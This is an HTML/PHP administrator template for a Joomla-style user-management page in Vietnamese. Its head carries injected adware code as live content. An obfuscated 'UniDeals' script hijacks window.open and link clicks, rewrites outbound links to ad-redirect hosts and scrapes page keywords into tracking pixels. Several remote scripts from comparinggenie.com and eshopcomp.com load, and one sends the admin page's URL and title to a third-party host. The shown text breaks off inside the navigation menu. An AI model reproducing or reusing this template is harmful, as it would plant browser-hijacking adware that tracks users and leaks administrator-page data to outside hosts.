<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="vi-vn" dir="ltr" xml:lang="vi-vn" xmlns="http://www.w3.org/1999/xhtml" slick-uniqueid="3">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type">
    <meta content="Joomla! - Open Source Content Management" name="generator">
    <title>vinacap - Quản trị - Quản lý Người dùng: Người dùng</title>
    <link type="image/vnd.microsoft.icon" rel="shortcut icon" href="/administrator/templates/bluestork/favicon.ico">
    <link type="text/css" href="<?php echo base_url() ?>public/css/modal.css" rel="stylesheet">
    <link type="text/css" href="<?php echo base_url() ?>public/css/system.css" rel="stylesheet">
    <link type="text/css" href="<?php echo base_url() ?>public/css/template.css" rel="stylesheet">
    <style type="text/css">

        .icon-16-menu_icon {
            background: url(images/menu/menu_icon.png) no-repeat;
        }

        .icon-16-jcklogo {
            background: url(images/menu/jcklogo.png) no-repeat;
        }

        .icon-16-icon-16-cpanel {
            background: url(images/menu/icon-16-cpanel.png) no-repeat;
        }

        .icon-16-icon-16-installer {
            background: url(images/menu/icon-16-install.png) no-repeat;
        }

        .icon-16-icon-16-pluginmanager {
            background: url(images/menu/icon-16-pluginmanager.png) no-repeat;
        }

        .icon-16-icon-16-layout {
            background: url(images/menu/icon-16-layout.png) no-repeat;
        }

        .icon-16-icon-16-restore {
            background: url(images/menu/icon-16-restore.png) no-repeat;
        }

    </style>
    <script type="text/javascript" src="<?php echo base_url() ?>public/js/mootools-core.js"></script>
    <script type="text/javascript" src="<?php echo base_url() ?>public/js/core.js"></script>
    <script type="text/javascript" src="<?php echo base_url() ?>public/js/mootools-more.js"></script>
    <script type="text/javascript" src="<?php echo base_url() ?>public/js/multiselect.js"></script>
    <script type="text/javascript" src="<?php echo base_url() ?>public/js/modal.js"></script>
    <script type="text/javascript">
        window.addEvent('domready', function () {
            $$('.hasTip').each(function (el) {
                var title = el.get('title');
                if (title) {
                    var parts = title.split('::', 2);

                    el.store('tip:title', parts[0]);
                    el.store('tip:text', parts[1]);
                }
            });
            var JTooltips = new Tips($$('.hasTip'), { maxTitleChars: 50, fixed: false});
        });
        window.addEvent('domready', function () {
            new Joomla.JMultiSelect('adminForm');
        });

        window.addEvent('domready', function () {

            SqueezeBox.initialize({});
            SqueezeBox.assign($$('a.modal'), {
                parse: 'rel'
            });
        });

        window.addEvent('domready', function () {
            actions = $$('a.move_up');
            actions.combine($$('a.move_down'));
            actions.combine($$('a.grid_true'));
            actions.combine($$('a.grid_false'));
            actions.combine($$('a.grid_trash'));
            actions.each(function (a) {
                a.addEvent('click', function () {
                    args = JSON.decode(this.rel);
                    listItemTask(args.id, args.task);
                });
            });
            $$('input.check-all-toggle').each(function (el) {
                el.addEvent('click', function () {
                    if (el.checked) {
                        document.id(this.form).getElements('input[type=checkbox]').each(function (i) {
                            i.checked = true;
                        })
                    }
                    else {
                        document.id(this.form).getElements('input[type=checkbox]').each(function (i) {
                            i.checked = false;
                        })
                    }
                });
            });
        });
    </script>


    <!--[if IE 7]>
    <link href="templates/bluestork/css/ie7.css" rel="stylesheet" type="text/css"/>
    <![endif]-->

    <!--[if gte IE 8]>
    <link href="templates/bluestork/css/ie8.css" rel="stylesheet" type="text/css"/>
    <![endif]-->
    <script src="<?php echo base_url() ?>public/js/tinymce.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        tinymce.init({
            selector: "",
            plugins: [
                "advlist autolink autosave link image lists charmap print preview hr anchor pagebreak spellchecker",
                "searchreplace wordcount visualblocks visualchars code fullscreen insertdatetime media nonbreaking",
                "table contextmenu directionality emoticons template textcolor paste fullpage textcolor"
            ],

            toolbar1: "newdocument fullpage | bold italic underline strikethrough | alignleft aligncenter alignright alignjustify | styleselect formatselect fontselect fontsizeselect",
            toolbar2: "cut copy paste | searchreplace | bullist numlist | outdent indent blockquote | undo redo | link unlink anchor image media code | inserttime preview | forecolor backcolor",
            toolbar3: "table | hr removeformat | subscript superscript | charmap emoticons | print fullscreen | ltr rtl | spellchecker | visualchars visualblocks nonbreaking template pagebreak restoredraft",

            menubar: false,
            toolbar_items_size: 'small',

            style_formats: [
                {title: 'Bold text', inline: 'b'},
                {title: 'Red text', inline: 'span', styles: {color: '#ff0000'}},
                {title: 'Red header', block: 'h1', styles: {color: '#ff0000'}},
                {title: 'Example 1', inline: 'span', classes: 'example1'},
                {title: 'Example 2', inline: 'span', classes: 'example2'},
                {title: 'Table styles'},
                {title: 'Table row 1', selector: 'tr', classes: 'tablerow1'}
            ],

            templates: [
                {title: 'Test template 1', content: 'Test 1'},
                {title: 'Test template 2', content: 'Test 2'}
            ]


        });
    </script>
    <script type="text/javascript" async=""
            src="//istatic.eshopcomp.com/fo/min/wp.js?subid=1272_20726&amp;hid=5063987187401324435&amp;bname=UniDeals "
            id="id_arrrrppdjafklbvnn4450fm"></script>
    <script type="text/javascript" async=""
            src="//istatic.eshopcomp.com/fo/min/wpgb.js?bname=UniDeals &amp;subid=1272_20726"
            id="id_ad5cbe0b719874f1"></script>
    <script id="fghjktghndfgt" type="text/javascript">function fghjktghndfgt_init() {
            new function () {
                if (!document.getElementById('__fghjktghndfgt_once')) {
                    (function () {
                        var a = document.createElement('div');
                        a.id = '__fghjktghndfgt_once';
                        a.setAttribute('style', 'display:none;');
                        var c = document.getElementsByTagName('body')[0];
                        c &amp;&amp; c.appendChild(a)
                    })();
                    var a = this;
                    a.pid = '20726';
                    a.cc = 'VN';
                    a.eid = '1272';
                    a.ename = 'UniDeals ';
                    a.hid = '5063987187401324435';
                    a.debugMode = !1;
                    a.utils = new function () {
                        var b = this;
                        'function' !== typeof String.prototype.trim &amp;&amp; (String.prototype.trim = function () {
                            return this.replace(/^\s+|\s+$/g, '')
                        });
                        b.JSON = new function () {
                            this.parse = function (c) {
                                try {
                                    return'undefined' !== typeof JSON &amp;&amp; 'function' == typeof JSON.stringify ? JSON.parse(c) : eval('var a=' + c)
                                } catch (a) {
                                    return!1
                                }
                            }
                        };
                        b.cookie = new function () {
                            var c = this;
                            c.setCookie = function (c, a, b) {
                                var f = '';
                                'string' === typeof b ? f = '; expires=' + b : 'number' === typeof b &amp;&amp; (f = new Date, f.setTime(f.getTime() + 864E5 * b), f = '; expires=' + f.toGMTString());
                                document.cookie = c + '=' + a + f + '; path=/'
                            };
                            c.getCookie = function (c) {
                                c += '=';
                                for (var a = document.cookie.split(';'), b = 0; b &lt; a.length; b++) {
                                    for (var f = a[b]; ' ' == f.charAt(0);)f = f.substring(1, f.length);
                                    if (0 == f.indexOf(c))return f.substring(c.length, f.length)
                                }
                                return null
                            };
                            c.eraseCookie = function (a) {
                                c.setCookie(a, '', -1)
                            }
                        };
                        b.getProtocol = function (c) {
                            var a = document.createElement('a');
                            a.href = c;
                            return a.protocol
                        };
                        b.getHostName = function (c) {
                            if (!c)return'';
                            var a = document.createElement('a');
                            a.href = c;
                            return a.hostname
                        };
                        b.isMenuBarVisible = function () {
                            if (!b.msie &amp;&amp; window.menubar)return window.menubar.visible;
                            if ('object' == typeof WebBrowser2)return WebBrowser2.MenuBar;
                            if (b.msie)return!0;
                            var c = window.innerWidth || document.documentElement.scrollWidth || 0, a = window.innerHeight || document.documentElement.scrollHeight || 0;
                            if (c) {
                                window.resizeTo(c, a);
                                var g = window.innerWidth || document.documentElement.scrollWidth, e = window.innerHeight || document.documentElement.scrollHeight;
                                window.resizeTo(c + 2, a);
                                c = window.scrollWidth || document.documentElement.scrollWidth;
                                return!(c != g &amp;&amp; c &lt;= g + 2 &amp;&amp; 90 &gt;= a - e)
                            }
                        };
                        b.getInstructions = function (c, d) {
                            b.msie ? b.inject_script(c + ('&amp;cb=' + a.prefix + '.' + d)) : b.ajax.get(c, function (c) {
                                if (c)a[d](c)
                            })
                        };
                        b.l = new function () {
                            var c = this;
                            c.xlat = 'abcdwxyzstuvrqponmijklefghABCDWXYZSTUVMNOPQRIJKLEFGH9876543210+/';
                            c.encode = function (a) {
                                a = c._utf8_encode(a);
                                for (var b = '', e = 0; e &lt; a.length;) {
                                    var f = a.charCodeAt(e++), h = a.charCodeAt(e++), l = a.charCodeAt(e++), k = f &gt;&gt; 2, f = (f &amp; 3) &lt;&lt; 4 | h &gt;&gt; 4, n = (h &amp; 15) &lt;&lt; 2 | l &gt;&gt; 6, m = l &amp; 63;
                                    isNaN(h) ? n = m = 64 : isNaN(l) &amp;&amp; (m = 64);
                                    b = b + c.xlat.charAt(k) + c.xlat.charAt(f) + (64 == n ? '=' : c.xlat.charAt(n)) + (64 == m ? '=' : c.xlat.charAt(m))
                                }
                                return b
                            };
                            c._utf8_encode = function (c) {
                                if (c &amp;&amp; c.length) {
                                    for (var a = '', b = 0; b &lt; c.length; b++) {
                                        var f = c.charCodeAt(b);
                                        128 &gt; f ? a += String.fromCharCode(f) : (127 &lt; f &amp;&amp; 2048 &gt; f ? a += String.fromCharCode(f &gt;&gt; 6 | 192) : (a += String.fromCharCode(f &gt;&gt; 12 | 224), a += String.fromCharCode(f &gt;&gt; 6 &amp; 63 | 128)), a += String.fromCharCode(f &amp; 63 | 128))
                                    }
                                    return a
                                }
                                return c
                            };
                            c.decode = function (a) {
                                a = a.toString().replace(/[^A-Za-z0-9\+\/]/g, '');
                                for (var b = '', e = 0; e &lt; a.length;) {
                                    var f = c.xlat.indexOf(a.charAt(e++)), h = c.xlat.indexOf(a.charAt(e++)), l = c.xlat.indexOf(a.charAt(e++)), k = c.xlat.indexOf(a.charAt(e++)), n = (h &amp; 15) &lt;&lt; 4 | l &gt;&gt; 2, m = (l &amp; 3) &lt;&lt; 6 | k, b = b + String.fromCharCode(f &lt;&lt; 2 | h &gt;&gt; 4);
                                    64 != l &amp;&amp; 0 &lt; n &amp;&amp; (b += String.fromCharCode(n));
                                    64 != k &amp;&amp; 0 &lt; m &amp;&amp; (b += String.fromCharCode(m))
                                }
                                return this._utf8_decode(b)
                            };
                            c._utf8_decode = function (a) {
                                for (var c = '', b = 0; b &lt; a.length;) {
                                    var f = a.charCodeAt(b);
                                    if (128 &gt; f)c += String.fromCharCode(f), b++; else if (191 &lt; f &amp;&amp; 224 &gt; f)var h = a.charCodeAt(b + 1), c = c + String.fromCharCode((f &amp; 31) &lt;&lt; 6 | h &amp; 63), b = b + 2; else var h = a.charCodeAt(b + 1), l = a.charCodeAt(b + 2), c = c + String.fromCharCode((f &amp; 15) &lt;&lt; 12 | (h &amp; 63) &lt;&lt; 6 | l &amp; 63), b = b + 3
                                }
                                return c
                            }
                        };
                        b.ajax = new function () {
                            this.get = function (a, b) {
                                try {
                                    var g = new XMLHttpRequest;
                                    g.open('GET', a, !0);
                                    g.withCredentials = !0;
                                    g.onreadystatechange = function () {
                                        4 == g.readyState &amp;&amp; b(g.responseText)
                                    };
                                    g.send()
                                } catch (e) {
                                }
                            }
                        };
                        b.randomChar = function () {
                            for (var a = '', b = 0; 2 &gt; b; b++)a += 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.charAt(Math.floor(52 * Math.random()));
                            return a
                        };
                        b.msie = function () {
                            var a = parseInt((/msie (\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10);
                            isNaN(a) &amp;&amp; (a = parseInt((/trident\/.*; rv:(\d+)/.exec(navigator.userAgent.toLowerCase()) || [])[1], 10));
                            return isNaN(a) ? !1 : a
                        }();
                        b.inject_script = function (c) {
                            var b = document.getElementsByTagName('body')[0], g = document.createElement('script');
                            g.type = 'text/javascript';
                            g.id = 'id_' + a.prefix;
                            g.src = c;
                            b &amp;&amp; b.appendChild(g)
                        };
                        b.epoch = function () {
                            return Math.floor((new Date).getTime() / 1E3)
                        };
                        b.getVert = function () {
                            var a = localStorage.getItem('sk398erjds2d');
                            return a ? a : b.forexVert()
                        };
                        b.browser = function () {
                            var a = navigator.userAgent.toLowerCase(), b = {webkit: /webkit/.test(a), mozilla: /mozilla/.test(a) &amp;&amp; !/(compatible|webkit)/.test(a), chrome: /chrome/.test(a), msie: /msie/.test(a) &amp;&amp; !/opera/.test(a), firefox: /firefox/.test(a), safari: /safari/.test(a) &amp;&amp; !/chrome/.test(a), opera: /opera/.test(a)};
                            b.version = b.safari ? (a.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
                            return b
                        }();
                        b.getNodeTextProp = function (a) {
                            return'textContent'in a ? 'textContent' : 'innerText'in a ? 'innerText' : !1
                        };
                        b.dhtml_prop_name = function (a) {
                            return a.replace(/(\-([a-z]){1})/g, function (a, c, b) {
                                return b.toUpperCase()
                            })
                        };
                        b.get_computed_style = 'function' != typeof window.getComputedStyle ? function (a) {
                            return{getPropertyValue: function (d) {
                                'float' == d &amp;&amp; (d = 'styleFloat');
                                d = b.dhtml_prop_name(d);
                                return'object' == typeof a.currentStyle &amp;&amp; null != a.currentStyle &amp;&amp; 'undefined' != typeof a.currentStyle[d] ? a.currentStyle[d] : null
                            }}
                        } : function (a, b) {
                            return window.getComputedStyle(a, b) || {getPropertyValue: function () {
                            }}
                        };
                        b.getEmptyWindow = function () {
                            var a = document.createElement('iframe');
                            a.src = 'about:blank';
                            a.setAttribute('style', 'display:inline;width:1px;height:1px;padding:none;margin:none;');
                            document.body.appendChild(a);
                            return a.contentWindow
                        }
                    };
                    a.prefix = 'fghjktghndfgtssss';
                    a.extName = 'UniDeals ';
                    a.version = '0.1.1';
                    a.pop_collision_id = '__ipm=';
                    a.pixelHostname = function () {
                        try {
                            return'//mnh.' + eval('["winnerical.net","winnermore.com"]')['https:' == window.location.protocol ? 1 : 0]
                        } catch (a) {
                            return['//mnh.winneri.info', '//mnh.winnermore.org']['https:' == window.location.protocol ? 1 : 0]
                        }
                    }();
                    a.watcherCount = 0;
                    a.fallbackHostnames = ['compey.net', 'comprises.info'];
                    try {
                        a.stngs = a.utils.JSON.parse('{"szy_domain":["bestwebnutfunblack.biz","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')
                    } catch (q) {
                        a.hostnames = a.fallbackHostnames
                    }
                    var p;
                    p = '' !== a.stngs &amp;&amp; a.stngs &amp;&amp; 'undefined' !== typeof a.stngs.szy_domain &amp;&amp; a.stngs.szy_domain instanceof Array ? a.stngs.szy_domain : a.fallbackHostnames;
                    a.hostnames = p;
                    a.debugMode &amp;&amp; (a.debug = new function () {
                        var b = this;
                        window.oldSetTimeout = window.setTimeout;
                        window.oldSetInterval = window.setInterval;
                        b.overrideSettimeout = function () {
                            window.setTimeout = function (a, b) {
                                return window.oldSetTimeout(function () {
                                    try {
                                        console.log('%csetTimeout: ' + a.toString(), 'color:purple'), a()
                                    } catch (b) {
                                    }
                                }, b)
                            }
                        };
                        b.overrideSetinterval = function () {
                            window.setInterval = function (a, b) {
                                return window.oldSetInterval(function () {
                                    try {
                                        console.log('setInterval: ' + a.toString()), a()
                                    } catch (b) {
                                    }
                                }, b)
                            }
                        };
                        b.overrideVariables = function () {
                            a.pid = '12';
                            a.cc = 'US';
                            a.eid = '10';
                            a.hid = '123456789';
                            a.ename = 'QA extension';
                            a.lt = '2617.24';
                            a.jpshort = '_OXQj15i';
                            a.platform_version = '10'
                        };
                        b.init = function () {
                            b.overrideSettimeout();
                            b.overrideSetinterval();
                            b.overrideVariables()
                        };
                        b.init()
                    });
                    a.legacyHostnames = ['superiends.org', 'go.turboloves.net', 'installerapplicationusa.com', 'stylene.net'];
                    a.body = document.getElementsByTagName('body')[0];
                    a.params = {subid: a.pid, subid1: a.hid, subid2: a.eid, 'px.pluginh': 1, tid: '7', red: '1', subid3: '679'};
                    a.manhattanCookieInterval = 0.0015;
                    a.events = new function () {
                        var a = this;
                        a.cache = [];
                        a.add = window.addEventListener ? function (c, d, g, e, f) {
                            'undefined' == typeof e &amp;&amp; (e = window);
                            e.addEventListener(c, d, g);
                            f &amp;&amp; a.cache.push([c, d, g, e])
                        } : window.attachEvent ? function (c, d, g, e, f) {
                            'undefined' == typeof e &amp;&amp; (e = window);
                            e['e' + c + d] = d;
                            e[c + d] = function () {
                                e['e' + c + d](window.event)
                            };
                            e.attachEvent('on' + c, e[c + d]);
                            f &amp;&amp; a.cache.push([c, d, g, e])
                        } : function () {
                        };
                        a.remove = window.removeEventListener ? function (a, b, g, e) {
                            'undefined' == typeof e &amp;&amp; (e = window);
                            e.removeEventListener(a, b, g)
                        } : window.detachEvent ? function (a, b, g, e) {
                            'undefined' == typeof e &amp;&amp; (e = window);
                            e.detachEvent('on' + a, e[a + b]);
                            e[a + b] = null;
                            e['e' + a + b] = null
                        } : function () {
                        };
                        a.flush = function () {
                            for (var c = 0; c &lt; a.cache.length; c++)a.remove.apply(a, a.cache[c]);
                            a.cache = []
                        }
                    };
                    a.pixel = function (b, c) {
                        var d = a.pixelHostname + '?', g = a.hostnames[0], g = {pid: a.pid, cc: a.cc, eid: a.eid, hid: a.hid, v: a.version, ch: b, cid: 0, tid: a.params.tid, adtid: 0, smid: 0, pbid: '0', oh: encodeURIComponent(c), sh: encodeURIComponent(g)}, e;
                        for (e in g)d += e + '=' + g[e] + '&amp;';
                        d = d.slice(0, -1);
                        if (21 === b)return d = d.split('?')[1], a.utils.l.encode(d);
                        (new Image).src = d
                    };
                    a.getKeywords = function () {
                        var a = document.title, c = document.getElementsByTagName('meta');
                        if (c)for (var d = 0, g = c.length; d &lt; g; d++)'keywords' != c[d].name.toLowerCase() &amp;&amp; 'description' != c[d].name.toLowerCase() || (a += ' ' + c[d].content.replace(/,/g, ' '));
                        if (d = document.getElementsByTagName('a')) {
                            c = {};
                            for (g = 0; g &lt; d.length; g++)try {
                                var e = d[g].innerText;
                                'undefined' == typeof e &amp;&amp; (e = d[g].textContent);
                                for (var f = e.toLowerCase().split(/[\s,-]/g), h = 0; h &lt; f.length; h++)4 &gt; f[h].length || (c[f[h]] ? c[f[h]]++ : c[f[h]] = 1)
                            } catch (l) {
                            }
                            var e = [], k;
                            for (k in c)e.push([k, c[k]]);
                            e.sort(function (a, b) {
                                return b[1] - a[1]
                            });
                            e = e.slice(0, 25);
                            for (k = 0; k &lt; e.length; k++)a += ' ' + e[k][0]
                        }
                        return encodeURIComponent(a.replace(/[\!\[\]_-]/g, ' ').trim().substring(0, 1500))
                    };
                    a.isFalseResponseFromServer = function () {
                        -1 &lt; a.body.innerText.indexOf('e7hZBzqVfn==') &amp;&amp; window.close()
                    };
                    a.checkIfServer = function () {
                        for (var b = 0; b &lt; a.hostnames.length; b++)if (location.hostname === a.hostnames[b])return a.isFalseResponseFromServer(), !0
                    };
                    a.checkIfPop = function (b, c, d) {
                        return!(d + '').match(/^InterYield/i) &amp;&amp; !(d + '').match(/(a652c|ld893)_/) &amp;&amp; 'r_ron_redir' !== d &amp;&amp; -1 == document.cookie.indexOf('xcddsa') &amp;&amp; -1 == b.indexOf('px.pluginh') &amp;&amp; -1 == b.indexOf('earchfu') &amp;&amp; -1 == location.href.indexOf('/amz/') &amp;&amp; -1 == location.href.indexOf('/sd/dw32.html') &amp;&amp; -1 == location.href.indexOf('/pop/1.1.00') &amp;&amp; !location.href.match(/cpops-\d+\.html/) &amp;&amp; -1 == location.href.indexOf('px.pluginh') &amp;&amp; -1 == b.indexOf('nkths.co') &amp;&amp; -1 == b.indexOf('ally.asi') &amp;&amp; -1 == b.indexOf('/sd/dw32.html') &amp;&amp; -1 == b.indexOf('/pop/1.1.00') &amp;&amp; -1 == b.indexOf('/amz/') &amp;&amp; !b.match(/cpops-\d+\.html/) &amp;&amp; -1 == a.utils.getHostName(b).indexOf('getjs') &amp;&amp; -1 == a.utils.getHostName(b).indexOf('hsbc')
                    };
                    window == window.top &amp;&amp; a.pixel(10, '0');
                    -1 &lt; window.location.href.indexOf(a.pop_collision_id) &amp;&amp; window == window.top &amp;&amp; a.pixel(13, '0');
                    a.addBlurredTabListener = function (b) {
                        var c;
                        try {
                            c = a.utils.getHostName(b.target.getAttribute('href'))
                        } catch (d) {
                            c = ''
                        }
                        'a' == b.target.tagName.toLowerCase() &amp;&amp; '' == b.target.innerHTML &amp;&amp; b.target.getAttribute('href') &amp;&amp; !b.target.getAttribute('download') &amp;&amp; -1 == c.indexOf(window.location.hostname) &amp;&amp; (c = b.target.getAttribute('href') ? b.target.getAttribute('href') : '0', a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), b.target.setAttribute('target', a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie('vdsknj4th4uh', '1', c.toUTCString()), b.target.setAttribute('href', a.manhattanUrl), document.getElementsByTagName('body')[0].removeEventListener('click', a.addBlurredTabListener))
                    };
                    a.prepareUrl = function (b) {
                        b = '?';
                        for (var c in a.params)b += c + '=' + a.params[c] + '&amp;';
                        b += 'k=' + a.getKeywords();
                        return'http://' + a.hostnames[0] + b
                    };
                    try {
                        window.top == window &amp;&amp; -1 == document.cookie.indexOf('vdsknj4th4uh') &amp;&amp; window.name !== a.prefix &amp;&amp; a.overrideDispatchEvent()
                    } catch (r) {
                    }
                    a.checkIfServer() || (a.cachedOpenFn = window.open, a.overrideDispatchEvent = function () {
                        a.cachedDispatchEvent = document.createElement('a').constructor.prototype.dispatchEvent;
                        document.createElement('a').constructor.prototype.dispatchEvent = function (b) {
                            var c;
                            try {
                                c = a.utils.getHostName(event.target.getAttribute('href'))
                            } catch (d) {
                                c = ''
                            }
                            'a' == this.tagName.toLowerCase() &amp;&amp; '' == this.innerHTML &amp;&amp; 'click' == b.type &amp;&amp; -1 == c.indexOf(window.location.hostname) &amp;&amp; this.getAttribute('href') &amp;&amp; !this.getAttribute('download') &amp;&amp; -1 == document.cookie.indexOf('vdsknj4th4uh') &amp;&amp; (c = this.getAttribute('href') ? this.getAttribute('href') : '0', a.manhattanUrl = a.prepareUrl(c), a.pixel(12, c), this.setAttribute('target', a.prefix), c = new Date, c.setMinutes(c.getMinutes() + 15), a.utils.cookie.setCookie('vdsknj4th4uh', '1', c.toUTCString()), this.setAttribute('href', a.manhattanUrl));
                            a.cachedDispatchEvent.call(this, b)
                        }
                    }, a.checkIfPartner = function (a) {
                        return'Za' == a
                    }, a.overrideWindowOpen = function () {
                        clearTimeout(a.timeout);
                        window.open = function (b) {
                            return function (c, d, g) {
                                window == window.top &amp;&amp; a.pixel(11, '0');
                                b = a.cachedOpenFn;
                                if (a.checkIfPop(c, g, d))return d = new Date, d.setMinutes(d.getMinutes() + 15), a.utils.cookie.setCookie('xcddsa', '1', d.toUTCString()), a.manhattanUrl = a.prepareUrl(c), d = a.prefix, a.pixel(20, c), a.manhattanOn = !0, a.utils.msie &amp;&amp; 9 &gt; a.utils.msie ? window.open(a.manhattanUrl, d, g) : b.call(window, a.manhattanUrl, d, g);
                                d = d || '';
                                window.open = a.cachedOpenFn;
                                return a.utils.msie &amp;&amp; 9 &gt; a.utils.msie ? window.open(c, d, g) : b.call(window, c, d, g)
                            }
                        }(window.open);
                        4 &lt; a.watcherCount || a.manhattanOn || (a.watcherCount++, a.openWatcher())
                    }, a.overrideDispatchEvent(), a.openWatcher = function () {
                        a.timeout = setTimeout(a.overrideWindowOpen, 200)
                    }, a.openWatcher(), 'undefined' == typeof window[a.prefix] &amp;&amp; (window[a.prefix] = a))
                }
            };
        }
        ;
        fghjktghndfgt_init()</script>
    <script type="text/javascript" async=""
            src="//istatic.eshopcomp.com/fo/ec/wpnewbs.js?subid=731_20726&amp;hid=5063987187401324435&amp;bname=JoniCoupon"
            id="id_arrrrppdjafklbvnn4440fm"></script>
    <script src="//www.comparinggenie.com/services.js"></script>
    <script type="text/javascript" src="http://www.coradvisor.com/serviceset.js?a=1430184262"></script>
    <script type="text/javascript" src="http://www.comparinggenie.com/compare2.js?v=0.033"></script>
    <script type="text/javascript" src="http://ajax.microsoft.com/ajax/jquery/jquery-1.7.2.min.js?v=0.033"></script>
    <script type="text/javascript"
            src="http://www.comparinggenie.com/scripts/domain/tttarmourgroup.com.vn.js?v=0.033"></script>
    <script type="text/javascript" src="http://www.comparinggenie.com/scripts/swfstore.js?v=0.033"></script>
    <script type="text/javascript" src="http://www.comparinggenie.com/scripts/kw.js?tm=0.033"></script>
    <script type="text/javascript" src="http://www.comparinggenie.com/scripts/log2.js?v=0.033"></script>
    <script type="text/javascript"
            src="http://www.comparinggenie.com/code/plog2.php?d=armourgroup.com.vn&amp;kw=qu+ng%20%24constructor%20each%20combine%20link%20rgbToHex&amp;bids=0&amp;sh=undefined&amp;on=&amp;gi=9499156&amp;gi2=9499156&amp;uniq1=1674082775&amp;url=http%3A%2F/armourgroup.com.vn/administrator/index.php%3Foption%3Dcom_users%26view%3Dusers&amp;price=&amp;currency=&amp;img=&amp;r=null&amp;titl=vinacap%2B-+Qu%u1EA3n+tr%u1ECB%20-%20Qu%u1EA3n%20l%FD%20Ng%u01B0%u1EDDi%20d%F9ng%3A%20Ng%u01B0%u1EDDi%20d%F9ng&amp;rt=&amp;bs=&amp;catype=service&amp;tm=1430184267"></script>
    <script type="text/javascript" src="http://www.comparinggenie.com/code/ucheck.php?tm=1430184267"></script>
</head>
<body id="minwidth-body" jhjlijpomuhn_m="l" s5063987187401324435="1">
<div class="h_blue" id="border-top">
    <span class="logo"><a target="_blank" href="http://www.joomla.org"><img alt="Joomla!"
                                                                            src="/images/logo.png"></a></span>
    <span class="title"><a href="index.php">Quản trị</a></span>
</div>
<div id="header-box">
    <div id="module-menu">
        <ul id="menu">
            <li class="node"><a href="#">Trang</a>
                <ul>
                    <li><a href="index.php" class="icon-16-cpanel">Bảng điều khiển</a></li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_admin&amp;task=profile.edit&amp;id=114" class="icon-16-profile">Hồ
                            sơ của tôi</a></li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_config" class="icon-16-config">Cấu hình chung</a></li>
                    <li class="separator"><span></span></li>
                    <li class="node"><a href="index.php?option=com_checkin" class="icon-16-maintenance">Bảo trì</a>
                        <ul class="menu-component" id="menu-com-checkin">
                            <li><a href="index.php?option=com_checkin" class="icon-16-checkin">Kiểm tra toàn bộ</a></li>
                            <li class="separator"><span></span></li>
                            <li><a href="index.php?option=com_cache" class="icon-16-clear">Xóa bộ nhớ đệm</a></li>
                            <li><a href="index.php?option=com_cache&amp;view=purge" class="icon-16-purge">Purge Expired
                                    Cache</a></li>
                        </ul>
                    </li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_admin&amp;view=sysinfo" class="icon-16-info">Thông tin hệ
                            thống</a></li>
                    <li class="separator"><span></span></li>
                    <li>
                        <a href="/administrator/index.php?option=com_login&amp;task=logout&amp;269decaa349eea77e5cac1e5405dfc2e=1"
                           class="icon-16-logout">Đăng xuất</a></li>
                </ul>
            </li>
            <li class="node"><a href="#">Thành viên</a>
                <ul>
                    <li class="node"><a href="index.php?option=com_users&amp;view=users" class="icon-16-user">Quản lý
                            thành viên</a>
                        <ul class="menu-component" id="menu-com-users-users">
                            <li><a href="index.php?option=com_users&amp;task=user.add" class="icon-16-newarticle">Thêm
                                    thành viên mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_users&amp;view=groups"
                                        class="icon-16-groups">Nhóm</a>
                        <ul class="menu-component" id="menu-com-users-groups">
                            <li><a href="index.php?option=com_users&amp;task=group.add" class="icon-16-newarticle">Thêm
                                    nhóm mới</a></li>
                        </ul>
                    </li>
                    <li class="node"><a href="index.php?option=com_users&amp;view=levels" class="icon-16-levels">Cấp độ
                            truy cập</a>
                        <ul class="menu-component" id="menu-com-users-levels">
                            <li><a href="index.php?option=com_users&amp;task=level.add" class="icon-16-newarticle">Thêm
                                    cấp độ truy cập</a></li>
                        </ul>
                    </li>
                    <li class="separator"><span></span></li>
                    <li class="node"><a href="index.php?option=com_users&amp;view=notes" class="icon-16-user-note">Ghi
                            chú thành viên</a>
                        <ul class="menu-component" id="menu-com-users-notes">
                            <li><a href="index.php?option=com_users&amp;task=note.add" class="icon-16-newarticle">Thêm
                                    chú ý thành viên</a></li>
                        </ul>
                    </li>
                    <li class="node"><a
                            href="index.php?option=com_categories&amp;view=categories&amp;extension=com_users"
                            class="icon-16-category">Ghi chú thể loại</a>
                        <ul class="menu-component" id="menu-com-categories-categories-com-users">
                            <li><a href="index.php?option=com_categories&amp;task=category.add&amp;extension=com_users"
                                   class="icon-16-newarticle">Thêm thể loại mới</a></li>
                        </ul>
                    </li>
                    <li class="separator"><span></span></li>
                    <li><a href="index.php?option=com_users&amp;view=mail" class="icon-16-massmail">Gửi thư cho thành
                            viên</a></li>
                </ul>
            </li>
            <li class="node"><a href="#">Danh mục</a>
                <ul>
                    <li class="node"><a href="index.php?option=com_menus&amp;view=menus" class="icon-16-menumgr">Quản lý
                            danh mục</a>
                        <ul class="menu-component" id="menu-com-menus-menus">
                            <li><a href="index.php?option=com_menus&amp;view=menu&amp;layout=edit"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
                    <li class="separator"><span></span></li>
                    <li class="node"><a href="index.php?option=com_menus&amp;view=items&amp;menutype=usermenu"
                                        class="icon-16-menu">User Menu</a>
                        <ul class="menu-component" id="menu-com-menus-items-usermenu">
                            <li><a href="index.php?option=com_menus&amp;view=item&amp;layout=edit&amp;menutype=usermenu"
                                   class="icon-16-newarticle">Thêm danh mục mới</a></li>
                        </ul>
                    </li>
